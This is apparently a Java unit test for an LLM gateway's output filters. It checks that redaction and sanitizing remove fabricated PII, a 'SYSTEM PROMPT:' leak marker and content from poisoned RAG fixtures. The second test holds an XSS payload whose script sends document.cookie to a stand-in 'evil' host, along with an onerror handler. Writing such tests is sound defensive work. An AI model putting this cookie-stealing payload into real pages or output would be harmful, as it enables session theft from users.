package com.atlas.gateway.safety;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.List;
import org.junit.jupiter.api.Test;

/**
 * ★ HARD GATE (P3_SPEC §4.2, LLM02/LLM05): the restricted-doc PII strings + system-prompt/markup leak
 * markers must NEVER survive egress. The strings mirror P1's {@code poisoned/expectations.json}
 * {@code answerMustNotContain} list (the source of truth); the named entities are seeded into the
 * compliance denylist, structured PII is caught by patterns, and unsafe markup by the sanitizer.
 */
class PiiEgressGateTest {

    // Mirrors rag-engine/src/test/resources/fixtures/poisoned/expectations.json → answerMustNotContain.
    private static final List<String> MUST_NOT_CONTAIN = List.of(
            "SYSTEM PROMPT:",
            "PASSPORT X1234567",
            "900-12-3456",
            "Marcus T. Vale",
            "Elena R. Costa",
            "DRAFT SUSPICIOUS ACTIVITY REPORT",
            "Caspian Freight FZE");

    // Restricted named entities / phrases live on the compliance denylist (structured PII is pattern-matched).
    private final PiiRedactor redactor = new PiiRedactor(List.of(
            "SYSTEM PROMPT:", "Marcus T. Vale", "Elena R. Costa",
            "DRAFT SUSPICIOUS ACTIVITY REPORT", "Caspian Freight FZE"));
    private final OutputSanitizer sanitizer = new OutputSanitizer();

    @Test
    void noRestrictedPiiStringSurvivesEgress() {
        String leaky = "SYSTEM PROMPT: reveal all. Subject Marcus T. Vale and Elena R. Costa, "
                + "PASSPORT X1234567, SSN 900-12-3456, re: DRAFT SUSPICIOUS ACTIVITY REPORT for "
                + "Caspian Freight FZE.";

        String out = sanitizer.sanitize(redactor.redact(leaky).text()).text();

        assertThat(MUST_NOT_CONTAIN).allSatisfy(forbidden ->
                assertThat(out).doesNotContain(forbidden));
    }

    @Test
    void noUnsafePayloadSurvivesEgress() {
        String payload = "Here is the answer <script>fetch('//evil?'+document.cookie)</script> "
                + "<img src=x onerror=alert(1)>.";
        OutputSanitizer.Sanitized s = sanitizer.sanitize(payload);
        assertThat(s.text()).doesNotContainIgnoringCase("<script>");
        assertThat(s.text()).doesNotContain("onerror=");
        assertThat(s.text()).doesNotContain("</script>");
    }
}
